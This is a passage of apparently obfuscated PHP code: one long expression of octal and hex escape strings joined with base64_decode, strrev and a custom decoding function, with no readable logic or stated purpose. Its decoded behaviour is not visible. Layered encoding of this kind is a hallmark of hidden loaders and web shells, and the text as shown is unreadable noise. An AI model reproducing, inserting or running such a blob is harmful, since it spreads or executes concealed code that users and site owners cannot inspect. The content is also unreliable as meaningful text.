Nr')."\342\32\311\322\20\331\225\324\162\140\143\205\52\53\125\101\65\225\52\7\344\333\110\152\221\252\340\272\3\0\112\22\314\266\152\150\224\210\24\342\246\54\236\342\250\165\324\325\110\304\324\30\347\40\246\305\122".base64_decode('FTErZvksH3EkLLE6R22NVFUcrCL14v0Kah/HmIYkO6pJhcXqclzA8wxTl1XAyaWkg4FYfvBrMRdO').base64_decode('ungOPE4Aww6TPD1eKya2Mg5NkeRCCqTg/hWHeUqNlCB6sRUSUTZLZzRbOqN6GmERoU423liVVcJ2')."\x10\xb8\x5a\xb2\x41\x7\x8a\x40\xd1\x50\x41\x28\x1e\x2d\x8a\xab\x81\x66\x80\xc1\xc1\xf8\x20\xc0\x52\x6\x95\x51\x5e\x12\xe0\x44\x2c\x81\x8e\x20\x84\xb3\x41\xac\x90\x86\xcc\xbf\xab\xb0\xd4\x84\xdb\x99\x37\x32\x94\xcb\x11\xfb\xe3"."\356\305\254\15\224\226\311\20\50\334\170\34\132\164\370\242\355\135\230\312\43\2\231\247\22\223\54\204\312\273\123\262\220\110\216\332\11\22\74\74\135\40\103\70\4\341\371\173\72\202\341\156\154\311\20\151\357"."\362\165\173\134\204\177\143\112\300\370\120\72\221\232\245\51\220\363\141\320\24\113\367\243\17\321\56\213\242\257\202\171\25\67\25\303\304\275\120\314\220\312\220\321\227\220\251\232\214\262\64\117\301\306\233\244\110"."\346\353\40\30\216\306\101\7\20\366\54\160\335\51\302\102\41\52\205\226\164\175\210\355\370\260\274\316\5\40\171\32\227\236\224\324\170\273\24\104\344\36\71\11\66\170\324\302\71\101\35\51\200\52\301\232\264".base64_decode('B3s6/NTUw5uwpHnDfmhmSCor0RLi/N4fRIrDKRbm9nkwgYkBIMKlAJgi+HOAn4n0sDAXGUEEquZx')."\x8e\xdc\xe7\x65\xe1\x2e\x66\xa5\x5\x13\x82\x61\x21\xe2\x9\x7b\xba\x23\x2c\x1a\xee\x3\x1c\x1e\xc2\x4\x6b\xa4\x6e\x4f\x24\xa\x5a\xd5\xd3\xdb\xcd\x57\x81\x80\x67\x21\x20\xa0\x20\x97\x53\x28\x7\xaf\x76\x4d\x6d\xad\x89\x61\x5b"."\xb\x1c\xc4\x3f\xf3\x68\xc\xea\xab\xf\xac\xac\x73\x48\x33\x56\xd7\x10\x1c\x6a\x9d\x10\x37\xb3\x40\x40\x8c\xf3\xaf\x2c\x8\xc4\x3\xc1\x4e\x1c\x47\x7e\x26\x7c\x85\x14\x97\xea\xa5\x7e\x9\x48\xbd\x51\x2e\xf5\x1a\x74\x39\x63\x33".strrev('$J],+¡íÉ?n‰q”;IÂ¢M·…	¹KB .c†Çô—¸]Äµr!„NáçØ\'©.a-tD').strrev('dq7¶,D`E¾âÍx9‰²P+æÂéÌrlUlx[`TšbÃ›'."\0".'d”Ü@"ïğ(&XšjiÏ').base64_decode('xE9KB20mITyvcWQu+SE7mrmkJ0i0pZkNrW/Bqh7w1xld5QN/AfATiILBUxkCmLQB/3zfKvgPT6iR').strrev('ãÄÕ¦9çQ«ÇŸ§%Duğ•©©§$/ÓH‚ÀTrü˜h‡ÏŸh¾mÌö=ü«9`/ğ*ÏD').strrev('ıx'."\0".'JšT÷1¤éïèYåŞ!!½ƒ†w‰«Ìş:ÙQHNPt-Îv‘<UY'."\n".'n±2­U3P—£n')."\x11\xd0\x45\xed\x94\x6\xb9\xb3\xf\x31\x4e\x44\x50\x24\x28\x89\x22\xb0\x85\xa0\xbd\x80\xd7\x83\x88\x20\x98\xc3\x1d\x1\xe6\xd5\xd6\x39\xd6\xd6\xeb\xf\x78\x45\xf3\x42\x88\x48\x96\x18\xc4\xe7\xc9\x2a\x33\x89\x56\x8e\xc6\x91\xa1"."\x21\x8d\xc0\x2e\xa7\x61\x44\x5e\x34\x82\xfa\x80\x46\x70\x7\xd0\x18\xea\x2e\x1a\x41\x4e\x45\x68\x4\x35\x94\x46\xe0\x16\xc5\xd7\x43\xd3\xc0\x3e\xf\xec\xd1\xe8\xe6\x2d\xc3\xf5\x5c\xb3\xf2\x10\x33\x9b\x99\x93\x4a\x8\x16\xb1\xb6"."\63\55\164\136\343\203\343\106\26\15\244\54\46\11\126\171\360\160\114\70\142\161\143\14\40\175\42\34\360\33\133\332\212\244\343\245\224\54\261\45\230\31\125\331\141\63\376\50\361\307\1\76\352\107\206\70\302"."\x67\xc9\xfa\xce\xcf\x64\xb0\xfe\x68\x5c\x13\xf4\xe4\x23\x8\x44\xce\xe9\xf8\x79\x87\x75\xb7\xc4\xb8\xcc\x52\xb6\x9\x22\xd6\xb5\xe\xf2\xab\xf3\x66\x59\x15\x0\x21\x84\x8c\xf5\xe1\xf8\x27\x46\x70\x63\xa4\x6\xc4\xa0\x66\x8a\x83"."\56\315\161\156\233\151\352\45\101\333\24\351\275\201\116\367\160\263\53\246\34\212\322\112\11\210\54\166\74\72\137\2\203\101\55\244\220\234\100\252\156\152\22\307\262\352\264\122\323\114\354\207\305\256\260\46\202"."\271\316\33\77\312\245\172\333\46\275\35\44\31\172\5\353\50\71\305\55\202\144\146\323\144\146\271\365\227\350\373\304\333\106\173\240\124\60\43\112\216\134\60\171\23\110\317\217\153\216\263\356\60\4\375\77\164"."\256\305\333\207\35\315\330\62\222\222\374\254\312\2\26\7\6\270\227\23\170\244\304\313\134\241\322\163\143\126\203\202\26\122\364\274\212\16\306\372\270\162\60\113\127\370\50\41\15\154\166\54\217\216\54\13\126"."\xf7\x2a\xa5\x2\xf8\x42\x88\xd\x80\xb3\x8e\x22\x53\x8f\x54\x68\xcc\x25\x26\x12\x31\x8d\x57\xd0\xf3\x28\xaf\xa0\x3f\x89\x9c\xbc\x90\x62\xf5\x1c\x26\x8c\xf1\xb6\xca\x99\x9a\xd6\x2d\x17\x46\xa3\xda\x42\x55\x21\x94\xe6\xd\xf6\xf5"."\x4\x82\xd4\x33\x3\x75\xe3\x42\x78\x4\xb9\x4a\x1\x9b\x11\xdd\x45\x23\x26\xd\x54\x6e\x92\x2e\x93\xfa\xf4\xd1\x95\x5\xd1\x29\xf7\xdd\x35\x5e\x24\x3\x34\x9e\x9c\xa0\x3c\xe1\xf6\x2e\x20\xa\xc6\x3b\xfc\x40\x6e\xf6\x2d\x22\xe2"."\326\374\240\67\36\11\366\206\351\111\6\214\43\153\212\260\257\175\61\73\131\140\320\16\317\102\73\4\26\27\365\164\126\4\63\101\20\302\21\317\215\207\203\120\212\366\5\72\154\31\42\135\314\11\206\25\26".strrev('Òà«S€À&Şq¶:¸ÅÓV,@mèÀ	ï,Ù!vÁÛÇ‚»ÄBZÌ;né{BİãˆLWæ{ø')."\354\214\203\225\275\65\266\272\246\72\346\156\165\115\145\362\44\36\32\301\166\240\62\130\65\242\26\66\346\166\271\110\1\54\0\244\131\146\231\114\151\220\170\31\212\140\173\116\313\27\210\64\260\132\360\315\1"."\315\123\134\166\137\36\176\174\106\30\217\54\216\260\236\304\153\100\245\164\13\355\140\64\361\114\334\206\14\376\102\42\152\124\311\27\53\42\132\210\317\142\135\41\202\134\252\306\173\10\57\112\242\71\27\106\342"."\30\53\125\255\211\316\304\144\11\32\225\362\376\346\263\30\200\134\234\135\221\222\370\306\207\314\141\247\350\261\11\366\272\310\171\123\11\333\324\43\0\176\324\54\114\120\16\144\272\34\213\235\171\147\52\26\355"."\204\256\57\142\247\261\12\252\272\340\173\42\251\25\122\310\335\6\141\15\162\222\62\331\22\330\106\322\103\144\270\376\30\316\141\225\166\301\104\146\263\112\56\206\342\62\262\270\216\213\167\172\313\235\206\232\51"."\70\345\134\106\3\74\70\233\247\120\171\320\222\316\375\226\24\65\260\111\246\256\367\234\340\23\102\32\106\6\205\323\245\5\36\131\63\167\57\60\142\260\230\110\71\260\117\331\255\107\4\325\256\111\152\44\336"."\217\72\300\222\46\250\215\7\113\246\37\272\265\341\266\132\220\43\42\207\77\144\331\226\270\267\64\52\50\127\146\342\160\127\54\350\301\123\136\220\37\344\127\20\371\101\166\302\116\127\164\272\320\16\51\35\302"."\265\31\337\56\23\107\146\40\255\155\224\336\104\21\255\365\266\121\250\127\137\266\322\101\223\52\321\273\233\247\57\322\350\354\352\366\264\73\1\107\253\237\316\157\260\143\321\56\225\21\211\74\154\64\306\241\367"."\x2\x85\xca\x64\xd3\x66\x48\x59\xd0\xab\x64\xf4\xcb\x7d\xbf\x4c\xb4\x7a\x18\xc2\x40\xec\x9a\x4\x88\x97\x29\x78\xf3\x40\x57\x6f\xc\xb5\x51\x5\x6\x72\x11\x5\xc7\xb1\xc9\x3b\x21\x27\x40\xe5\xac\xc2\xb0\x19\x38\x54\xe9\xbb\x8b".strrev('b'."\r".'ğÅ<1@j¯dwu¾4‚!Ÿ¼EğÓlÊŠJÂ<‰š=Ø±r}FÈ1wùQw}².ï¥Qw~*')."\x9e\x16\x68\xdf\x52\xdc\x7f\xf4\x12\x24\x51\xee\xcf\xa\x82\x22\x16\xe2\xe0\x18\x32\x89\x28\xf5\xe4\x64\xc3\x84\x12\x8\x3f\x93\x80\x36\x9c\xdd\x4c\xea\xd1\x29\x65\xbb\x35\xc3\xa8\x70\x49\x6\xa0\x12\x76\xfe\x59\xc2\xfc\x46\x42".base64_decode('0qYCHTeqhiQnCpqep2NDnC4x/znMuw53wYO3fDjsY2aZ3fKIJ6NEFMjGSEf5RoqaoYiOm1IKcgjC').strrev('(¹ÓÇ9bÌZ ñtH´ê5ƒ‹y°n½3ÌC½“8r'."\n".' *A”PÈAæÚÔˆÊiÓ\\ÈäwŒ').base64_decode('dHrorAhwCsZvmD0Ibr9AQzJsNJxkQmdRz5DWJ/HPaZWq59S5t6dgJIJ93s1XRqnfJNuUsLlainXG')."\272\143\121\261\137\115\135\116\247\101\265\5\357\54\226\272\200\157\110\264\351\143\273\205\42\273\336\311\25\35\101\221\104\344\234\314\15\60\240\341\366\160\234\121\52\162\267\131\201\126\21\374\277\247\126\221\144"."\340\342\114\147\50\127\110\50\226\4\217\261\130\6\17\41\337\136\224\251\10\73\20\344\123\213\170\274\143\116\256\100\267\26\332\64\252\173\264\262\12\320\153\125\123\325\304\152\360\133\123\345\250\202\302\26\212"."\303\21\206\0\364\355\252\246\211\325\50\120\103\154\107\127\20\65\62\301\111\15\77\225\45\173\213\126\331\64\205\323\204\126\324\167\160\342\327\273\353\335\303\204\307\264\56\207\137\344\56\54\355\13\306\110\34".strrev('Mg8véO6š}DŠv«Jy©æâ$çÉmÍFİÉÍ>éë–S§{w‡”&¬])‰ÈY59—zHğ')."\x69\x6d\x19\x37\xb7\x1d\x1d\x2b\x9a\x4a\x37\x3c\x17\x84\x2e\xbb\xb0\x83\xcf\x16\x72\x50\x30\x17\xce\x55\x16\x71\x5b\x63\x63\xe5\x25\xbc\x2f\x2f\xaf\xd0\xa\x60\x5d\x4\x9b\xe9\xbc\x2b\x49\x3a\xb3\xf4\xbf\xf0\x38\xee\xc\xac\xa0"."\230\303\232\116\116\127\11\333\255\257\155\24\247\4\41\64\203\114\137\154\5\333\4\217\44\150\17\365\26\107\113\5\147\73\220\34\234\130\336\151\252\264\40\66\325\132\361\241\133\127\53\276\310\127\41\307\212".base64_decode('2zgWZ0h5HsTeGpsk0YWn4F3JCcUOPM/ptpjAIBemIFX0VUUnxjxbfeFoOIHcBqcImKVgOTeVSihW')."\xa7\x90\x76\x57\x91\xf6\x5e\x40\x59\xe0\xf8\x3b\x45\x1f\x94\x23\x40\x1a\x87\xc9\x5\x65\xc4\x74\x42\x12\x70\x52\xf\x19\xe5\x29\x7c\xae\x57\xac\x6a\x92\x50\x53\x25\x94\xde\x92\x9a\xb2\x7f\x12\x9d\x64\x3b\x4b\x25\xfa\xc1\x8a\x85"."\212\173\5\212\200\32\341\147\345\131\244\166\31\214\65\23\324\355\202\277\160\34\124\356\221\16\314\157\251\276\241\151\372\154\360\77\341\267\364\40\276\124\64\233\131\220\172\254\33\357\116\123\126\301\75\110\322"."\266\301\321\265\270\351\23\300\274\33\31\23\240\74\306\202\307\153\153\361\77\112\32\212\267\251\202\163\302\12\74\65\245\120\325\363\2\131\156\5\225\35\326\357\31\32\320\31\276\314\311\76\221\33\344\25\116"."\xc0\x8b\x36\x42\xb5\x83\xa0\x3e\x1a\x97\xce\xd0\xc2\x2c\xb0\xf8\x64\xb6\x54\x18\x6c\x16\x12\x25\x53\xd3\xa4\xbc\x5c\x18\x25\xfb\x86\x49\x46\xd3\x24\x3\xab\x40\x4d\x72\x35\xa6\xd\x10\x21\x9c\x9b\xf9\xd3\x84\x8b\xe\xf7\x10\x82".strrev('„÷Ûİ¼@ÚîïéÛĞ(Ri0¢,Â9‰\\¡íDtÙ2°qrZ­•.	.âàº“İğ¡–X'."\n".'Im')._kodDe('MAMwtgFv9oV7Yoi1MZyJ0lO+qSNhrE8sWBMRwI9hSXIDN0SMdLySmHxyyhHzrPKJI4CZQRoETvsXyA==')."\344\104\41\234\74\245\145\256\133\155\141\243\303\115\265\165\215\153\361\271\334\23\340\106\315\15\357\257\12\223\41\71\64\123\306\16\367\116\20\332\301\15\263\45\151\256\54\341\216\157\236\2\57\33\322\123\244"."\54\130\325\331\365\176\213\75\163\17\75\52\236\353\226\305\104\70\343\302\32\25\311\331\146\155\210\35\370\125\74\311\364\44\155\156\61\333\345\302\302\362\54\260\160\127\262\122\222\33\35\24\270\5\167\252\344".base64_decode('ZENUxbK4QLGe6bJjxAoEUpSTg5AI+SqAk10kIQQ3QzjB4q7RFO4UQMXBp+BmWFczWXrstBIXBMWF').strrev('Ò­Ú½]MqOõ‹ '."\r".'Sö$x™<y:zâ„8‘º`ÏÖg,9çî;¤vª)äÁMDaË«Õ')."\253\272\130\225\65\257\213\141\343\170\314\145\305\7\65\47\135\315\20\11\300\216\211\345\316\123\311\164\33\347\236\312\25\134\331\225\234\4\357\351\232\233\133\372\331\331\357\0\115\243\22\243\132\67\213\16\362"."\212\254\63\332\307\202\355\75\134\202\146\144\215\71\210\13\251\110\172\254\76\255\132\207\230\367\124\334\213\142\330\123\54\212\121\372\104\4\164\204\343\316\251\11\67\233\337\156\4\163\45\271\102\55\105\101\334"."\305\6\207\367\151\266\4\250\323\211\300\103\200\137\2\371\153\231\35\16\312\142\100\26\230\153\44\165\265\150\132\70\23\176\164\240\12\371\273\135\46\17\311\30\245\112\242\276\316\253\220\367\276\52\300\211\160"."\12\141\1\274\52\163\41\313\221\164\45\327\134\205\252\153\144\25\5\344\107\114\245\322\107\100\306\52\211\362\303\274\314\172\114\67\65\260\4\62\345\121\342\327\271\67\114\164\367\74\75\213\161\200\10\127\23"."\226\340\337\211\23\330\12\0\35\211\347\200\324\212\24\224\20\237\101\267\1\151\176\100\106\334\114\207\302\301\150\260\235\372\16\256\164\222\326\110\45\131\3\153\46\363\215\20\325\35\235\357\133\154\305\140\262"."\201\233\100\310\360\353\245\102\201\335\172\102\341\224\255\154\11\344\257\42\222\55\231\174\115\204\216\376\242\120\361\337\40\140\301\121\12\164\323\242\244\134\124\24\140\16\173\10\274\102\16\174\16\14\313\243\323".base64_decode('QfBrSr+U06inmPra2lpnbR34n90DkU801daWodTWNqH/cQI6pyUdak0B85cyGoIwrChU4ZmgqIUS').base64_decode('lY1AfyEnLU10os8RdnZzJAW2jsQUe0sDWsYyKHQJgDObhoGAAoYDtZz2JL3eBWh8oEE9fIUU2WDM').base64_decode('wfrwzeLHXLQHRaB45m6yNMv3ARSsh0lWdQgQzjugACV4qYFR8d4TJTN1aBTLMeMbGO1hJVUioaw2')."\x1c\xe7\xcb\x1b\x8c\x9e\xca\x62\xa8\x4f\xe0\xfe\x84\x12\xb\x6b\x3d\xe9\x18\xca\xf8\x28\x71\xd0\x4b\x42\x72\x41\x87\xc\x56\x6\xd5\x9c\xc5\x22\x22\x2e\x94\x2d\x7a\xb7\x4\xfc\x5\x8a\xb7\x74\x58\xf1\x99\x3b\xf9\x0\x14\x74\x5c"."\274\367\220\363\63\364\76\2\326\11\150\32\47\364\244\256\161\273\204\262\147\77\150\54\122\371\356\131\70\12\243\260\61\60\331\111\31\205\370\50\0\337\16\267\63\127\56\102\1\366\44\133\36\117\112\170\326"."\302\340\76\134\332\231\117\50\321\261\13\366\132\43\134\303\32\304\343\40\367\26\105\313\140\255\57\351\71\127\121\327\62\140\44\14\241\136\20\36\252\14\146\350\345\230\25\220\130\203\104\74\21\10\25\56\350"."\213\12\204\250\330\241\76\330\5\62\266\50\240\162\65\77\1\150\125\211\20\22\332\231\37\141\21\10\167\52\275\302\76\23\131\102\131\313\200\73\12\53\204\325\354\133\110\210\356\120\115\362\152\207\140\320\102"."\xd0\xb8\x6\x8\x3c\x2a\x10\xcf\x54\x55\xad\x9d\xd0\xe\xec\xd\x7e\xdb\x67\x85\x97\x51\x19\x99\x21\xcd\x54\xa8\x47\x53\xc8\x9a\xf6\xd6\x9a\x4b\x68\xe0\x52\x8a\x5\x1b\xcf\xce\xb2\xc4\x93\x5a\x38\x69\xba\xd8\xc3\x10\x15\xa8\xc3"."\x4a\x1\x65\x43\x8d\xe6\xc\x2c\xa0\x89\x71\x9\x21\x86\x74\x5\x5c\xc8\x8d\x22\x97\x95\x6d\x51\xbb\x3e\x1\xe2\x7f\x26\x65\x61\xd4\x3\x5c\x81\x79\x5f\x86\x9d\x81\x7b\x1f\xc7\x2b\x7c\x81\x64\x62\x59\x5c\xf4\x6a\xd2\x95\x4c\x67"."\154\40\106\164\145\0\205\157\13\220\142\56\20\107\51\337\354\326\126\0\276\46\273\247\273\152\245\352\76\25\310\134\303\206\324\23\225\146\270\352\347\110\175\301\276\31\215\65\22\220\376\162\112\237\222\230\257"."\x9a\xee\xe9\xd\x33\x5d\xd\x33\xa4\xea\xf9\x5d\xd1\xee\x80\x43\x82\x46\x52\x52\x27\x90\x26\xb5\x1a\xa9\x3d\xab\x6b\x79\xc5\x5d\x3f\x13\x5a\x83\x34\x4e\x6f\x70\xcd\x6e\x94\x22\x72\x5a\xd6\x55\x92\x8b\x70\x4f\xa2\xb9\x3a\x4c\x7e"."\341\3\140\161\241\312\161\141\153\216\5\0\312\165\221\272\56\276\320\353\207\271\210\316\45\230\51\350\25\61\61\43\322\230\40\312\125\342\126\37\342\132\351\300\132\54\104\30\340\270\22\174\62\310\162\207\170".base64_decode('yjrK5cFU5FMaLhkCqcEoIyyonZ4T317qU1Psxr8/ZgxMjbm7lZQqt2kjONqPfpDCKtT+q4HRaf9L')."\164\152\154\200\152\207\301\17\166\51\174\307\346\236\24\362\166\70\71\72\333\41\42\117\313\334\137\70\251\30\362\23\311\277\100\313\247\245\107\355\33\104\34\306\317\50\340\160\73\34\5\40\72\170\331\12\11".base64_decode('+D6PoEGy4DLlH11LlZK0yJAlVkylF4obVS+ZQkhYE59LGgHSOmuRHisMoGkOoagdGDbV0jYMmzZp').base64_decode('ki/YwbREOcZIfe2ANdZa3V9ID7TWVMOMqwgMl0K7lx75WKoiftXSvdO0xDK3SjaKbkI/qG5z51a7')."\246\326\264\264\360\175\244\33\22\241\245\4\126\147\350\35\263\274\154\113\44\114\221\165\346\111\323\15\4\22\175\264\370\137\347\124\60\72\311\14\357\52\377\333\234\156\277\227\164\170\377\0\16\314\5\175\262".base64_decode('pGVgak1/SwUIyxfSlaGKTQb9xsY7Rp7mipGlLUafBCMajDGiwki1DZn2IW1KdSwWSyHn5oSW3EsI')."\x84\xf9\xc3\xaf\x9e\x0\xe2\xf5\x22\x6\x6\x50\x84\x9\x14\x6f\x6e\xbf\xec\x4c\xa3\xba\xb6\x0\x64\xa6\x7a\x3c\xd7\x35\xb5\x65\x22\xcd\x8c\xee\x51\x28\x81\x1c\x3e\x8e\x9a\x8d\x75\x4d\x65\x5f\x1f\xe9\xf0\x81\x3f\x46\x94\x93\x49"."\361\350\212\205\40\3\256\354\364\365\104\375\121\277\57\202\101\373\34\62\356\260\303\111\37\20\75\326\303\307\321\42\101\347\306\106\152\153\301\337\154\360\47\203\277\44\370\113\101\22\216\31\340\337\131\340\17"."\xa4\x34\x0\x68\x83\x12\x1b\x99\x9e\x0\x7f\x20\x75\x26\xf8\x9d\x9\xb1\xd2\xe0\x6f\x3a\xe7\x22\x2d\x2d\xbc\x60\xd0\x5a\x8f\xb3\x3\x34\xbb\x52\xe1\x20\x4b\xb\xa3\x70\xa1\x82\x70\xd3\x9f\x58\x46\xf9\x26\x3d\x9b\x80\x6f\x47\x28".base64_decode('Mp1Dco5p7AgvksFPxnQ47+Cs49OjGlplIjw4WyvUhOMyTEsjxqLh3v+MJU5j1qxpTldtXX1D4/QZ')."\63\251\143\211\102\51\257\350\364\304\305\215\334\110\66\300\37\65\105\177\370\131\216\365\60\273\150\120\347\5\171\346\27\240\110\335\234\50\43\202\356\223\41\152\213\15\52\243\335\364\200\2\56\225\151\170\23"."\106\322\146\265\205\10\345\270\143\375\220\333\304\50\45\102\117\272\202\76\20\211\105\262\364\34\165\122\155\175\252\211\375\143\203\121\221\50\143\270\204\272\342\207\244\344\22\150\23\325\174\133\126\314\360\212\105"."\205\67\247\0\21\30\355\370\266\126\70\10\207\45\12\145\13\47\226\50\16\37\352\242\262\17\6\344\22\364\245\0\61\115\0\317\163\1\171\51\355\362\55\362\167\270\332\341\33\132\221\42\63\113\67\302\235"."\104\341\226\5\120\345\135\160\327\127\120\162\244\52\151\170\317\30\146\153\34\150\222\143\131\121\311\70\212\205\214\43\243\246\35\211\174\321\141\252\351\64\374\307\1\306\320\121\114\246\34\306\120\306\241\244\345".base64_decode('EcewkihS/+B6vUPR047BVNKRSuqOFCigoA87CkraoQG4PlzvKIKwAWAy+DN04kljSE0pGthbGVqu')."\204\164\277\106\306\200\217\122\61\210\102\26\131\172\301\337\341\255\165\55\12\263\324\21\307\30\11\366\142\26\177\153\61\243\226\142\26\333\213\21\23\275\324\261\373\74\74\44\64\216\237\5\223\163\320\121\74".base64_decode('+W8kX3TBPyRGKBDRgcZ8HnQmIShvuCgiuqka5cKIpqtAMpYrVyRoTzS0tDnMtMhE1AhJEepGKsJS')."\x48\xdc\x28\xc7\xb4\xb4\x42\xd3\xa3\xec\xe1\x9c\x84\x6a\x86\xc0\x3e\x5c\xe6\x6a\x9c\x78\x34\x1\xdc\x88\x17\xa1\xad\xab\x90\x4\x81\x0\x3b\xa4\x8e\x50\x9b\xf2\x79\x2e\x7c\x7b\xcd\xf1\x8b\x30\xd1\xc1\xe0\xba\x3c\x6c\x4b\x23\x44".base64_decode('aJsElScIKAfODloYPBiNw3NRoWXzXP4ub9iFykNmkfzb8EpWF50l4I8yAZshZnJaQs7FcRn8+kwu').base64_decode('AK7CDP7nuXAclOaypmSoxlZOK2RUs5SytqkzFEFVKYEMLhtKDpT3HzJYMOTcf8K3YqSUITWpdMuD')."\25\10\12\102\51\311\344\31\6\316\301\171\274\45\7\74\134\141\131\370\373\116\210\371\172\331\311\240\230\305\117\223\340\161\70\350\72\232\33\145\111\161\270\120\220\107\140\241\142\121\230\265\322\2\104\106\233".base64_decode('BJyR2pd6AKFBFaUOcedBimkPdod6oz6vqyISBQoXGCJVVkiGp9FgZ47OI8fINQYKUlkDhfETVDFT')."\171\152\7\264\205\20\65\36\105\364\262\104\1\340\57\64\114\317\347\73\324\134\205\205\350\133\320\100\122\311\360\202\16\226\13\266\31\312\372\260\2\212\77\22\104\15\5\253\24\177\264\127\374\142\105\204\276"."\254\152\52\155\162\256\354\123\50\113\171\52\355\35\256\231\130\251\357\170\52\205\264\251\262\61\306\50\225\241\370\26\12\13\61\11\312\111\207\234\62\15\207\134\162\310\171\335\41\17\351\216\204\126\30\164\244"."\214\64\370\63\34\140\351\205\311\351\34\100\314\311\216\34\140\140\216\274\232\122\35\171\20\120\115\307\110\336\141\64\344\311\42\234\57\202\304\142\203\103\113\353\16\175\20\24\151\144\341\334\30\164\14\313\103"."\x8e\xe1\xbc\xec\xc8\x37\xca\xe\x2d\x93\x71\xc\x2d\x4f\x3b\x86\x87\x1c\x43\x5a\xd2\x61\xd2\x23\x64\x2a\x26\xc5\xd\x51\xd\x12\x7a\xdf\x1a\x84\x60\x17\xfc\x7\x8c\x4b\xbe\x68\xc4\x4b\x5\x75\x84\xba\x51\xcf\x6b\xda\x90\x94\x1f"."\312\246\376\23\76\166\166\156\307\307\102\11\340\173\272\146\14\312\56\244\216\245\350\366\345\210\245\367\23\204\125\120\137\21\214\266\134\54\72\200\100\223\2\333\116\144\17\74\140\317\311\353\323\317\126\101\252".base64_decode('8xWHkpqYA1eGfgLLCYJ+C0zEK1dct5yiM28o8DhFFFGJyAWKS1pWRsHAAaOMtTLaP28B9QN5e6hu')."\25\374\267\176\225\14\170\353\220\246\47\124\203\76\202\305\232\76\40\12\233\377\175\46\221\31\376\17\271\270\174\232\121\12\372\377\374\125\41\323\250\102\15\214\376\373\354\74\17\350\50\152\323\376\77\164\24"."\314\24\27\337\243\43\110\206\253\250\46\41\247\166\325\272\370\265\13\22\153\350\334\153\4\263\164\310\221\156\204\123\155\10\114\263\41\107\136\33\2\63\132\165\350\371\241\204\43\77\70\4\2\120\146\316\203"."\171\10\302\12\20\11\215\341\64\231\273\15\231\172\107\103\246\350\220\301\304\117\250\200\3\250\103\151\107\301\30\162\200\331\17\376\37\66\101\161\340\67\17\144\221\74\224\320\363\100\124\37\322\22\224\355\100"."\155\143\227\126\200\317\101\300\307\22\134\303\360\350\316\61\226\160\135\216\237\105\47\157\345\31\106\377\127\66\340\260\116\330\44\71\124\213\13\66\30\377\65\213\260\225\205\223\205\222\160\155\321\36\106\230\221"."\363\134\244\25\130\112\204\11\16\46\177\162\64\222\31\336\330\44\343\71\115\33\54\25\5\126\200\123\361\56\333\160\365\327\326\255\252\33\160\361\351\375\237\60\161\261\377\11\13\61\6\1\211\367\14\106\107"."\351\361\157\257\42\371\222\220\101\330\103\162\276\311\371\345\52\221\137\256\42\314\156\300\42\374\332\211\203\161\135\230\0\73\201\236\205\222\337\62\256\333\257\203\75\243\70\257\52\354\36\210\310\105\231\61\61".strrev('á+¥.C ûÈ%%[ T¿Áp]'."\n".'^ôªÌ¹øË‡Œ¸NËoÏ:,-ÜÂŞll°[ï“a,6')."\x1d\x23\xd0\x22\xb0\x43\x83\x5e\x65\x18\x8\x74\xa2\xf0\x7c\x89\xa0\xa1\xa5\x31\x9\x5\x4d\x16\x1c\xec\xc\x4\xdb\x3c\xc8\xf1\x43\xbc\x2b\x48\x1f\xf0\x6e\x6e\x6e\x31\xc4\x1b\xb2\x2c\xa0\x17\x27\xf8\x50\x86\x3d\x94\xd9\x27\xeb"."\120\17\302\21\45\132\203\22\111\225\264\2\273\343\42\347\142\303\30\25\107\102\135\241\270\247\67\332\45\70\317\140\240\20\121\344\101\57\225\103\110\60\354\77\315\303\135\147\45\144\203\236\27\365\365\365\71"."\341\171\73\264\246\111\242\107\316\333\140\242\4\31\141\276\271\152\120\113\45\163\132\51\125\305\13\164\327\271\152\245\306\332\72\251\267\100\265\113\351\366\210\276\147\137\320\234\302\163\222\266\27\355\255\211\226"."\47\223\351\307\161\22\330\113\0\262\22\166\314\301\41\105\27\114\42\350\53\340\344\267\73\270\220\250\72\267\7\103\344\374\240\173\76\123\147\361\52\105\52\64\267\227\75\57\215\64\160\106\362\271\71\114\277"."\107\70\25\235\353\155\52\352\132\61\255\26\122\22\300\51\30\115\336\346\52\257\147\141\123\125\13\110\222\163\71\230\52\271\133\346\272\71\42\31\261\120\70\30\352\360\63\267\31\41\70\4\21\322\160\244\146"."\355\364\221\231\101\76\145\121\206\257\2\75\135\305\225\341\253\120\235\252\44\352\302\17\231\27\341\140\35\365\32\53\332\371\22\65\123\150\77\47\364\3\214\62\23\34\104\40\136\37\364\216\40\220\107\226\235"."\x82\xdb\xec\x3e\x30\x90\x98\x1e\x76\x89\xa6\x87\xa0\x23\xe0\xfa\x4\x2f\xda\x61\xaf\xc2\x8e\x49\x42\xad\x23\x34\x69\x70\xd7\x58\xd2\x59\xae\x8c\x62\x92\xeb\x58\x4\x87\xb5\x4b\xb9\xe1\xba\xe3\x4c\xa9\xba\x82\x1c\xda\xc0\xcc\x36"."\264\212\37\245\312\123\310\263\202\340\142\261\44\314\142\105\260\224\346\126\336\11\146\215\1\212\104\367\165\266\201\46\321\110\163\25\61\115\244\363\2\62\303\252\26\314\367\346\106\232\224\21\70\250\240\311\55"."\x41\xf4\x94\x77\x8f\x66\x22\xed\xa9\xb9\x6e\x31\xd\x20\x12\xbd\xde\x16\x36\x5c\x10\x83\x2\x51\x71\xb0\xd5\xa8\x2a\x2d\x56\xa2\x85\xfb\xf5\x26\x89\xbd\xc3\xce\x29\xb6\x64\xa6\x9\xc1\x2e\x94\xf5\xd1\x26\xa9\xc2\x7b\xee\xb9\x8a".strrev('&D“BÃÈá¥à~¨\\í‰âqØ~r$£°º»ëÔé†Käu­¬hÍgšÕ@ªíIÅhî±0‘*&ôŠ')."\202\103\242\363\3\207\102\236\150\173\227\103\102\304\352\220\72\175\121\0\356\5\377\140\63\6\207\4\347\65\110\6\363\334\41\101\173\154\207\324\333\203\177\271\142\72\350\73\114\26\310\200\10\165\45\210\103".strrev('¨&‰ \'TVªÁ&¯3†P_a4/Ic¸'."\0".'Ä\'O¸)c¥ê¡¡j}MóDt½!²Ô,g’Q&ãD¦Š').strrev('ÉÚ.Bq”‘¢8)ZÚú¤êYRv°«¬peTÿÆ*d¢L‹Ç„ RÿÿñÊ 